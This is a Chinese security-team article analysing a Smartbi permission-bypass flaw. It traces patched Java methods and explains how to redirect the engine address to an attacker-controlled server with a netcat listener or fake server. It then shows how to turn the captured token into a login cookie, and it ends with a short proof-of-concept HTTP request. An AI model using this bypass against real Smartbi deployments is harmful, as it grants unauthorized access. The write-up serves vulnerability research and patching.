#  【复现】Smartbi 权限绕过漏洞详细分析

原创 CVES实验室  [ 山海之关 ](javascript:void\(0\);)

**山海之关** ![]()

微信号 shg-sec

功能介绍 山海关安全团队公众号。

____

___发表于_

收录于合集

#漏洞复现 1 个

#poc 1 个

![]()********

**免责声明**

 **1\. 本文仅用于技术交流，目的是向相关安全人员展示漏洞的存在和利用方式，以便更好地 提高网络安全意识和技术水平。**

 **2\. 任何人不得利用本文中的技术手段进行 非法攻击和侵犯他人的隐私和财产权利。一旦发生任何违法行为，责任自负。**

 **3\. 本文中提到的漏洞验证 poc  仅用于授权测试，任何未经授权的测试均属于非法行为。请在法律许可范围内使用此 poc。**

 **4\. CVES实验室对使用此 poc 导致的任何直接或间接损失不承担任何责任。使用此 poc 的 风险由使用者自行承担。**

 **消息来源**

  * 

    
    
     https://www.smartbi.com.cn/patchinfo

 **漏洞分析**

 **补丁情况如下：**

![]()

 **通过查看 patch.patches 文件可知要请求的路由。**

![]()

 **然后再查看 RejectSmartbixSetAddress.class 文件，可知具体存在危险的类名和方法名。**

![]()

 **查看 smartbix.datamining.service.MonitorService#getToken 方法，在第⼀个红框说明请
求权限(不需要登录)；第二个红框的作用是配置⼀个Token并返回其字符串内容(此处不做详细跟进)；第三个红框则是将Token发送给对应服务器。**

 **其中：**

 **experiment - > EngineAddress , **

 **service- >ServiceAddress **

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # EngineApipublic static <T> T postJsonEngine(String type, Object data, Class<T> dataType, Object... values) throws Exception {    String url = EngineUrl.getUrl(type, values);    return HttpKit.postJson(url, data, dataType);}  
    # EngineUrlpublic static String getUrl(String val, Object... values) {    EngineUrl engineUrl = null;  
        try {        engineUrl = valueOf(val);    } catch (Exception var6) {        throw SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail(val);    }  
        if (engineUrl != null && engineUrl.url != null) {        String url = engineUrl.url;        url = String.format(url, values);        if (url.contains("lang=")) {            Locale currentLocale = LanguageHelper.getCurrentLocale();            String language = currentLocale.toString();            url = MessageFormat.format(url, EngineApi.address("engine-address"), language);        } else {            url = MessageFormat.format(url, EngineApi.address("engine-address"));        }  
            return url;    } else {        throw SmartbiXException.create(CommonErrorCode.NOT_FOUND_RIGHT_PATH).setDetail(val);    }}  
    # EngineApipublic static String address(String type) {    if (type.equals("engine-address")) {        return SystemConfigService.getInstance().getValue("ENGINE_ADDRESS");    } else if (type.equals("service-address")) {        return SystemConfigService.getInstance().getValue("SERVICE_ADDRESS");    } else {        return type.equals("outside-schedule") ? SystemConfigService.getInstance().getValue("MINING_OUTSIDE_SCHEDULE") : "";    }}

 **跟进 EngineApi#postJsonEngine 方法中，然后调用  EngineUrl#getUrl
方法获取要请求的URL，其中请求路由可以通过自身获取，请求的IP地址则通过调用 EngineApi#address
方法获取。EngineApi#address 则是通过 SystemConfigService 获得要请求的IP地址。**

 **一开始已经提到补丁中的方法名，通过那几个方法名可以设置对应的地址。**

![]()

 **使用  @RequestBody 注解，所以请求头中不能使用 Content-Type: application/x-www-form-
urlencoded ，否则就会对值进行url编码，导致后续利用失败。在第⼆个红框中则是对 SystemConfigService 对应键进行更新。**

 **通过上面说的两个方法，正常就可以获得 token 值。那么接下来就是进行登录。**

![]()

 **通过 loginByToken 方法就可以获取Cookie。**

![]()

 **但有可能返回的值是 false ，这是由于在调用  getToken
方法时，使用了nc监听或者返回的值不是json格式，导致报错，那么你的token就没被存入对应的变量中，这时候你就需要编写⼀个 fake server
，返回任意的json格式即可。**

 **小坑**

 **按照上面说的坑开始翻代码 从 this.catalogService.loginByToken(token) 进入，不断跟进方法。**

 **最后跟进 smartbi/repository/AbstractDAO#load 方法中，如下图：**

![]()

 **load 方法代码如下：**

![]()

 **差别主要就在：**

 **obj = this.daoModule.load(this.domainClass.getName(), id); ， 从此**

 **处跟进去后就开始各种绕，此处不进行过多描述。**

 **直接在**
**org.hibernate.event.def.DefaultLoadEventListener#loadFromSecondLevelCa**
**che 下断点。**

![]()

 **当你用⼀个正常返回获得的token在此处是取得到值的；但是如果是异常退出或nc监听的话此处取的则是
null。后续返回null的话则会存在缓存，可以看上图。**

 **然后再去看 getToken 方法。在该方法结束后，进程是还没有结束的，此处将断点打在**

 **org.hibern ate.action.EntityInsertAction#afterTransactionCompletion**

![]()

 **这里就是将token存入对应变量中，这样后续登录才能找到值。而如果是异常退出是不会执行该方法的， nc监听也不会走到这里。**

 **若有不对的地方，还请师傅们指点和纠正。**

 **修复建议**

 **官方已经发布修复补丁。**  

 **poc**

  *   *   *   *   *   * 

    
    
     POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1Host: urlContent-Type: application/jsonContent-Length: x  
    http://url

 **CVES实验室**

       ** **“CVES实验室”(www.cves.io)由团队旗下 **SRC组与渗透组合并而成，** 专注于漏洞挖掘、渗透测试与情报分析等方向。近年来我们报送漏洞总数已达八万余个，其中包含多个部级单位、多个通信运营商、Apache、Nginx、Thinkphp等，获得CNVD证书、CVE编号数百个，在不同规模的攻防演练活动中获奖无数，协助有关部门破获多起省督级别的案件。****

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

